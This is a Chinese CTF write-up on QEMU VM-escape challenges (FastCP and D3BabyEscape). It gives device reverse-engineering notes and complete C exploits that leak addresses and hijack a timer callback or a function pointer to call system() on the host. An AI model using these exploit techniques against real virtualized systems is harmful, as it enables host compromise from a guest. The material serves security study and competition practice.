常用指令
====

```text
lspci 
ls /sys/devices/pci0000\:00/0000\:00\:04.0/
-monitor telnet:127.0.0.1:4444,server,nowait 后 nc 127.0.0.1 4444可以info pci看的更清楚,这个技巧仅限于qemu，发现内核不好使
```

qemu到底在pwn什么
============

- 主要是pwn qemu这个elf文件本身，说是虚拟机但是更像用软件实现虚拟化，qemu文件中有各种各样的函数可以使用，因此泄露之后如何有任意函数执行那么就可以拿到shell
- 远程一般要反弹shell
- 主要是把exp复制到.cpio这个压缩包中，这样就可以在qemu中运行我们所写的攻击脚本

```bash
mkdir exp
cp ./initramfs-busybox-x64.cpio.gz ./exp/
cd exp
gunzip ./initramfs-busybox-x64.cpio.gz 
cpio -idmv < ./initramfs-busybox-x64.cpio

mkdir root
cp ../exp.c ./root/
gcc ./root/exp.c -o ./root/exp -static 
find . | cpio -o --format=newc > initramfs-busybox-x64.cpio
gzip initramfs-busybox-x64.cpio
cp initramfs-busybox-x64.cpio.gz ..
```

有关调试
====

- 主要有两种调试方法 
    1. 直接gdb qemu这个文件，然后set args设置启动参数
    2. 运行./launch.sh，然后ps -ef | grep qemu，通过gdb -p 进程号就可以连上进行调试了
- 发现想打exp里面的断点很困难，那就把断点打在qemu这个文件中，比如b fastcp\_mmio\_write,然后c就行了

基础知识
====

- 有很多前人的参考博客就基本知识就不过多赘述，主要记录自己的一些理解  
    [入门最好的博客](https://www.anquanke.com/post/id/254906#h3-10)  
    [一篇简短地讲qemu pwn到底在干什么的博客](https://www.cnblogs.com/JmpCliff/articles/17332921.html)  
    [很详细地讲了qemu的基础知识](https://xz.aliyun.com/t/6562?time__1311=n4%2BxnD0DRDBAi%3DGkDgiDlhjmYgxIrxQSu0iD&alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-2)  
    [这篇博客也不错](https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/)

地址转化
----

- 这一点还是比较重要的，只有地址正确才能正确的执行相应的函数

PCI 设备地址空间
----------

- 主要就是MMIO和PMIO，目前只pwn过MMIO的

主要漏洞
----

- 一般的漏洞都是读写的错误，特别是写的越界，因此注意检查size的限制很重要

FastCP
======

[主要参考了这个博客](https://www.anquanke.com/post/id/254906#h3-8)

- 入门qemu逃逸第一题，花了好几天时间才把所有的细节搞明白 题目分析
    ----
- 题目名字就是fastcp，所以ida直接搜发现这些有关的，一般漏洞也都是因为mmio\_write，所以开始代码审计，审计过程略

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b0ff8d9d7e1021e25fbc6e4b7479fff94004af79.png)

- 在mmio\_write这个函数中跟进一个函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-daea1741654ba5a686e1f10a18f2a9598c11e5f4.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-52ab2a96166a8720c92358d9983dc4e82cd72200.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-65332fc2ed53c3173416d3add1550f78470b66f7.png)

**这里的函数执行竟然是通过存储的timer结构体，因此如果可以控制timer结构体意味着就可以任意函数执行**

- 然后就是看是MMIO还是PMIO

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6abf375dbaa0d27110b6cbfa9a9c2c9fa7941d87.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f2410b1b02b89adee627b629f39089edb346f568.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0533b3963a36cebec8625001cf400c8636e07f9a.png)

发现resource0，那就是MMIO了

exp分析
-----

### mmio\_write与qemu的联系

- 看到qemu中的这个函数就在想这个mmio\_mem怎么和这个qemu中的这个函数联系起来
- **应该这样理解，通过打开resource0这个设备再映射，那么往mmio\_mem写入的东西会被这样处理:FastCPState \*opaque和size这两个参数不用管，往mmio\_mem写入东西的偏移就是addr,对应偏移的值就是val，这样一切都联系起来了**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6d5a4589a84455bad59df8adda707962a98debf0.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8f52af9c4cedd662edc032725ad64529381ecba1.png)

### userbuf和phy\_userbuf

- 这里要先理解我们写的exp和qemu是两个不同的进程，而我们的最终目的是通过泄露出qemu中的东西然后任意函数执行最终pwn掉qemu这个宿主
- 地址转换这个不多赘述

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0ec98227185bfc7e9a631d00daa517a3f2763b02.png)

### qemu中的函数和exp中的函数分析

- 主要是fastcp\_cp\_timer这个函数,cp\_info是这个函数的一个局部变量，cp\_list\_src要是**phy\_userbuf才行，因此我们不能在qemu这个进程中访问到exp进程的东西，但是却可以通过phy\_userbuf访问到。同时我们可以在exp中把想要的数据复制给userbuf，这样就联系起来了**
- cmd=4，把cp\_list\_src也就是phy\_userbuf中的cp\_info复制给qemu中的cp\_info这个局部变量，然后把cp\_buffer中的数据复制给dst

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6e326326a3b8bc3aba84d5bd4ad070a216a5dd2d.png)

- cmd=2，把src中的值复制给cp\_buffer

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b350d0c1057e151dbcf5a19f394cd4103a4faad6.png)

- cmd=1，把src的值复制给buf，再把buf的值复制给dst

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2d7481f06b4e3d8615be986b31c76b864a121989.png)

exp攻击流程
-------

### 任意地址的泄露

- 注意到把buf的值复制到dst时没有长度限制，但是在qemu这个结构体中，buf后面就是timer这个结构体，因此可以把timer结构体的内容泄露

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d4c941230c197a217b5add2534e086a10c5dfe48.png)

- 看到exp中leak\_timer = \*(uint64\_t\*)(&amp;userbuf\[0x10\]),这就是通过phy\_userbuf这个桥梁，在exp进程中获取到了qemu进程的东西

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ac12bb5f7e9b9f6d55dd9530aef7d8cf19255dcc.png)

### 任意函数的执行

1. 前面说到有cb(opaque)这个任意函数执行，因此设置相应的值就可以

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0a10f77f88f3bc71cad4acef0a2312177d260776.png)

2. 这里先说说这个struct\_head是什么，其实就是这个结构体的头部，所以才有timer.opaque = struct\_head + 0xa00 + 0x1000 + 0x30

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9019664d89c7702219f501ed47d5b9ed8d093d76.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e3465284110119dc6d3506433234f3141e25ee75.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5a5bdddbfb2ec5200884a9d320717ee0fe5ba200.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-bfbc98708b9557bcaf04cd5fe45c8487468eb499.png)

3. 再说说exp中的这部分

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c76ece96d3a0be8859427087f6240c480833ddb3.png)

- src和dst都是gva\_to\_gpa(userbuf + 0x1000) - 0x1000 ，先把src复制到buf,因为len=0x1000 + sizeof(timer)所以buf后面的timer结构体就被修改为我们期望的样子了。后面buf复制到dst其实都不重要了，然后只要让cmd=1，也就是调用fastcp\_cp\_timer函数就可以任意函数执行了
- 这里又来了一个知识点，因此虽然是memcpy(userbuf + 0x1000, &amp;timer, sizeof(timer)); 但是后面却是gva\_to\_gpa(userbuf + 0x1000) - 0x1000，这是因为多于一页物理地址不一定连续了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2371c256044de4ad0095a8874a0e700b1ce3ede0.png)

- exp

```C
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/io.h>
#include <unistd.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN ((1ull << 55) - 1)
char* userbuf;
uint64_t phy_userbuf, phy_userbuf2;
unsigned char* mmio_mem;

struct FastCP_CP_INFO
{
    uint64_t CP_src;
    uint64_t CP_cnt;
    uint64_t CP_dst;
};

struct QEMUTimer
{
    int64_t expire_time;
    int64_t timer_list;
    int64_t cb;
    void* opaque;
    int64_t next;
    int attributes;
    int scale;
    char shell[0x50];
};

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

uint64_t page_offset(uint64_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void* addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
    {
        die("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

//用户虚拟地址gva到用户物理地址gpa
//先根据用户虚拟地址gva算出，用户所在页号gfn,再根据gfn和offset算出用户物理地址gpa（将gfn和offset位拼起来）
uint64_t gva_to_gpa(void* addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

//一开始mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
//mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_mem + addr)) = value;
}
//这个read感觉完全没用，不用都行
uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}

void fastcp_set_list_src(uint64_t list_addr)
{
    mmio_write(0x8, list_addr);
}

void fastcp_set_cnt(uint64_t cnt)
{
    mmio_write(0x10, cnt);
}

void fastcp_do_cmd(uint64_t cmd)
{
    mmio_write(0x18, cmd);
}

//这个fastcp_do_readfrombuffer和fastcp_mmio_read完全不一样
//把buffer的数据复制到dst
void fastcp_do_readfrombuffer(uint64_t addr, uint64_t len)
{
    //以下三个是往cp_info里面写入值
    struct FastCP_CP_INFO info;
    info.CP_cnt = len;
    info.CP_src = NULL;
    info.CP_dst = addr;
    memcpy(userbuf, &info, sizeof(info));
    //以下三个是往opaque->cp_state写入值
    fastcp_set_cnt(1);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(4);
    sleep(1);
}

//把src的数据复制到buffer
void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
{
    struct FastCP_CP_INFO info;
    info.CP_cnt = len;
    info.CP_src = addr;
    info.CP_dst = NULL;
    memcpy(userbuf, &info, sizeof(info));
    fastcp_set_cnt(1);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(2);
    sleep(1);
}

void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
{
    struct FastCP_CP_INFO info[0x11];
    for (int i = 0; i < 0x11; i++)
    {
        info[i].CP_cnt = len;
        info[i].CP_src = srcaddr;
        info[i].CP_dst = dstaddr;
    }
    memcpy(userbuf, &info, sizeof(info));
    fastcp_set_cnt(0x11);
    fastcp_set_list_src(phy_userbuf);
    fastcp_do_cmd(1);
    sleep(1);
}

//在qemu_main_loop中会不断执行各个函数，包括fastcp_mmio_write这个函数

int main(int argc, char* argv[])
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");
    //把刚才打开的resource0文件内容映射到一个地方
    mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem: %p\n", mmio_mem);
    /*
    MAP_ANONYMOUS 是 mmap() 函数的一个标志，用于创建匿名映射，即在进程的地址空间中映射一段未与任何文件关联的内存区域
    因此有了-1这个参数
    */
    userbuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED)
        die("mmap userbuf failed");
    /*
    mlock() 是一个系统调用，用于锁定指定内存区域，防止其被交换到磁盘上。
    这可以确保这些内存区域的内容始终驻留在物理内存中，而不会因为系统内存不足而被交换出去。
    */
    mlock(userbuf, 0x10000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("user buff virtual address: %p\n", userbuf);
    printf("user buff physical address: %p\n", (void*)phy_userbuf);

    fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
    fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
    fastcp_do_readfrombuffer(phy_userbuf, 0x30);

    //泄露pie,得到system函数的地址
    uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
    printf("leaking timer: %p\n", (void*)leak_timer);
    fastcp_set_cnt(1);
    uint64_t pie_base = leak_timer - 0x4dce80;
    printf("pie_base: %p\n", (void*)pie_base);
    uint64_t system_plt = pie_base + 0x2C2180;
    printf("system_plt: %p\n", (void*)system_plt);
    //堆上的某个地址
    uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);

    struct QEMUTimer timer;
    memset(&timer, 0, sizeof(timer));
    timer.expire_time = 0xffffffffffffffff;
    timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
    timer.cb = system_plt;
    timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30; //这里应该是在qemu这个进程中timer.shell
    printf("struct_head: %p\n",struct_head);
    strcpy(&timer.shell, "echo flag{a_test_flag}");
    //变量仅仅在栈上或堆上是不行的，得到mmio里面去才能被qemu用
    memcpy(userbuf + 0x1000, &timer, sizeof(timer));
    //把src复制到buffer,再把buffer复制到dst
    //把src复制到buffer时就把整个结构体中的timer结构体给覆盖为我们自己修改后的结构体
    fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
    fastcp_do_cmd(1);

    return 0;
}
```

```bash
mkdir exp
cp ./initramfs-busybox-x64.cpio.gz ./exp/
cd exp
gunzip ./initramfs-busybox-x64.cpio.gz 
cpio -idmv < ./initramfs-busybox-x64.cpio

mkdir root
cp ../exp.c ./root/
gcc ./root/exp.c -o ./root/exp -static 
find . | cpio -o --format=newc > initramfs-busybox-x64.cpio
gzip initramfs-busybox-x64.cpio
cp initramfs-busybox-x64.cpio.gz ..
```

D3BabyEscape
============

题目分析，开始逆向
---------

- 首先根据-device启动参数知道设备是l0dev，接下来进行逆向。逆向当然不是看所有部分，我们只关心一些重点，也就是这些部分。通过search text找到所有含有l0dev的字符串然后逆向这些函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7eea2c43b6ce1af91a08a4e72bae66f872f9fc80.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fa5a462c9f8f28cbcfa05105fecb76a65257a8d0.png)

- 这里有个小技巧，其实大部分mmio\_read或者mmio\_write这些函数的参数列表其实都是相似的，这里之前参考之前的一个题进行修改，事实证明确实如此

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e63aceb89c60aae8c19c07cbb5c4507e3ffa4953.png)

- 逆向有开源的东西时不要硬逆，看看有没有什么资源是现成的那就可以直接用
- l0dev\_realize函数,可见mmio,pmio都有

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ebf82333643ce2cb7474563f8fa372cc8c778681.png)

- l0dev\_instance\_init函数
- **其实qemu都会维护一个结构体，这里的v1一般就是这个结构体的头部，因此可以根据此大致逆向出这个结构体是个什么，而且这个结构体一般都有buffer**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5a3c121f7b5ccf04e1555eeb83d703ca093cbfca.png)

- 结构体,逆向结构体的过程就是算算偏移，要自己体会

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0ef23afa8b1e164128c2d1132b4337a2ec526ca0.png)

- mmio\_read函数,如果可以控制offset，就可以任意地址泄露

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e4d62f8ef501ed300c2e4d3835a35b3b9cd9c417.png)

- mmio\_write函数,发现addr=128可以控制offset的值,addr=64这个看的很奇怪，其实就是根据结构体头部+0xd48来执行这里的函数，然后将buf作为rdi,就是一个任意函数执行

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-821801e9624b688f43cc75c438238d8d739bf297.png)

- pmio\_read函数,复制值666就可以让magic=1

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8b588df888334e788b95b2b0e6d095128ad22756.png)

- pmio\_write函数,magic=1可以任意地址写

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-efad3a0f0499ab209adc23e4e585e24993e554fe.png)

exp分析
-----

- 有了任意地址读和写，任意函数执行，这个题就很简单了
- exp没什么好分析的，注意如何使用libc中的函数，从Dockerfile里面看到libc版本然后手动找偏移就行了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-16f4a4b6c9136976fd74e4d3b6fe4659f8ac7b3b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5c24668d42f303314cc3e2c82a1cdc1cc0a3b25a.png)

- 通过info pci找到pmio的端口

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-60476f86345ac75a78af9bd916be86b88d1e56d2.png)

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/io.h>

char *mmio_mem;

size_t mmio_read(size_t addr)
{
    size_t *mmio = (size_t *)((size_t)mmio_mem + addr);
    return *(mmio);
}

void mmio_write(size_t addr, size_t val)
{
    size_t *mmio = (size_t *)((size_t)mmio_mem + addr);
    *(mmio) = val;
}

#define IO_PORT 0xc000
size_t pmio_read(size_t addr)
{
    size_t pmio = IO_PORT + addr;
    return inl(pmio);
}
void pmio_write(size_t addr, size_t val)
{
    size_t pmio = IO_PORT + addr;
    outl(val, pmio);
}

int main()
{
    int mmio_fd;
    size_t libc_addr = 0, system_addr;

    // Open and map I/O memory for the string device
    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
    {
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    if(iopl(3) == -1) /* Apply to system for accessing the port */
    {
        perror("iopl");
        exit(EXIT_FAILURE);
    }

    mmio_write(128, 0x100);
    libc_addr = mmio_read(4);
    libc_addr = libc_addr - 0x460a0; // srandom offset
    printf("libc_addr: %#lx\n", libc_addr);
    system_addr = libc_addr + 0x50d70;
    //让magic的值为666
    pmio_write(0, 666);
    pmio_read(0);
    //覆盖rand_r为system，任意函数执行
    pmio_write(20, system_addr);

    mmio_write(64, 0x6873);

    return 0;
}
```

```bash
mkdir exp
cp ./bin/rootfs.img ./exp/
cd exp
cpio -idmv < ./rootfs.img

mkdir root
cp ../exp.c ./root/
gcc ./root/exp.c -o ./root/exp -static 
find . | cpio -o --format=newc > rootfs.img
cp rootfs.img /home/zp9080/attachment/bin
```